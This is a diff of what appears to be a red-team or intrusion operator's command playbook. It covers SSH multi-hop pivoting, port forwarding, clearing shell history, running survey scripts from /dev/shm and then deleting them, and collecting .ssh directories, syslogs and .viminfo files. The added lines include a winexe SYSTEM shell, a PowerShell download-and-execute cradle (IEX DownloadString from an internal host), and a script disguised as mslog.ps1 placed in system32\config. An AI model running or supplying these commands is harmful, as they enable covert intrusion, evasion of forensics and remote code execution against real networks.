@@ -8,11 +8,11 @@ ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
 
 unset HISTFILE HISTFILESIZE HISTSIZE 
 
-scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/survey.sh root@1.1.1.1:/dev/shm/.a
+scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/mando.sh root@1.1.1.1:/dev/shm/.a
 source /dev/shm/.a
 rm -f /dev/shm/.a
 
-Ran the following mando commands in script survey.sh
+Ran the following mando commands in script mando.sh
 date; date -u
 ps -elf
 netstat -natup || ss -natup
@@ -33,6 +33,7 @@ cat /root/.viminfo
 cat /home/*/.viminfo
 
 
+cat ./survey.sh | ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 | survey-<ip>
 
 Ran the following commands in survey.sh script
 cat /etc/*syslog*
@@ -53,7 +54,7 @@ ls -latr /root/.ssh
 ls -latr /home/*/.ssh
 
 
-Ran the following exit commands in script survey.sh
+Ran the following exit commands in script mando.sh
 ps -elf
 netstat -lptn
 find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
@@ -69,7 +70,7 @@ ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:2.2.2.2:22
 ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
 ssh -o ControlPath=/tmp/hop-2 root@127.0.0.1
 unset HISTFILE HISTFILESIZE HISTSIZE
-scp -o ControlPath=/tmp/hop-2 /root/Downloads/survey.sh root@1.1.1.1:/dev/shm/.a
+scp -o ControlPath=/tmp/hop-2 /root/Downloads/mando.sh root@1.1.1.1:/dev/shm/.a
 source /dev/shm/.a
 rm -f /dev/shm/.a
  
@@ -82,13 +83,29 @@ ssh -S /tmp/hop-# -O exit root@127.0.0.1
 ===============
 
 script termscreen.$$
-
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+winexe only:
 ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
 winexe -U admin3 //127.0.0.1 cmd.exe --system
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ssh only:
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10609:10.10.100.77:22
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -R 8000:127.0.0.1:8000
+
+powershell.exe -nop -exec bypass
+IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+scp -o ControlPath=/tmp/hop-1 ./mando.ps1 root@1.1.1.1:"C:\windows\system32\config\mslog.ps1"
+import-module c:\windows\system32\config\mslog.ps1
+
+
+
 
 date /t && time /t
 tasklist /V
-tasklist /svc | findstr WinDefend
 wmic process get commandline, processid, parentprocessid /format:list
 netstat -anob
 netsh advfirewall show allprofiles
